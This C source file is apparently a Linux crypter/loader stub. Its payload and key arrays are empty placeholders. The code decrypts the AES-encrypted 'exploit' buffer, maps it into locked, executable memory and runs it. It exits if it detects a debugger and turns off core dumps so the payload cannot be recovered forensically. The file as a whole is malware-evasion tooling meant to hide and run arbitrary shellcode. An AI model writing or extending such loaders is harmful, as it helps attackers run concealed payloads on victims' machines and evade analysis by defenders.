#define _DEFAULT_SOURCE
#include "crypto/crypto.h"


/*
 *
 *  LINUX
 * 
 */
#ifdef __unix__

#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <memory.h>
#include <unistd.h>
#include <stdio.h>

#define EXPLOIT_SIZE sizeof(buf)
#define KEY_LENGTH sizeof(key)


__uint8_t buf[] = {
    // exploit here
};

__uint8_t key[] = {
    // key here
};


void (* exploit)();

int main ( void ) {
    // anti-debug
    if (ptrace(PTRACE_TRACEME) == -1) {
        write(2, "DEBUGGER DETECTED!", 18);
        _exit(1);
    }

    // decrypt exploit
    AesCipher *cipher;
    size_t decrypted_exploit_size;
    cipher = AesInit(key, KEY_LENGTH);

    for (size_t cnt = 0; cnt < EXPLOIT_SIZE; cnt += 16) {
        AesDecryptor(cipher, buf + cnt);
        AesGetBlock(cipher, buf + cnt);
    }

    AesFree(cipher);
    unpad(buf, EXPLOIT_SIZE, buf, AES_BLOCK_SIZE, &decrypted_exploit_size);

    // allocate exploit memory
    if ((exploit = mmap(NULL, decrypted_exploit_size, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
        write(2, "mmap error", 10);
        _exit(1);
    }

    // disable swap
    if (mlock(exploit, decrypted_exploit_size) == -1) {
        write(2, "mlock", 5);
        _exit(1);
    }
    
    // copy encrypted exploit
    memcpy(exploit, buf, decrypted_exploit_size);
    
    // protect the memory
    if (mprotect(exploit, decrypted_exploit_size, PROT_EXEC | PROT_READ) == -1) {
        write(2, "mrotect error", 13);
        _exit(1);
    }

    // disable core dump
    if (madvise(exploit, decrypted_exploit_size, MADV_DONTDUMP) == -1) {
        write(2, "madvise", 7);
        _exit(1);
    }

    exploit();

    return 0;
}

#endif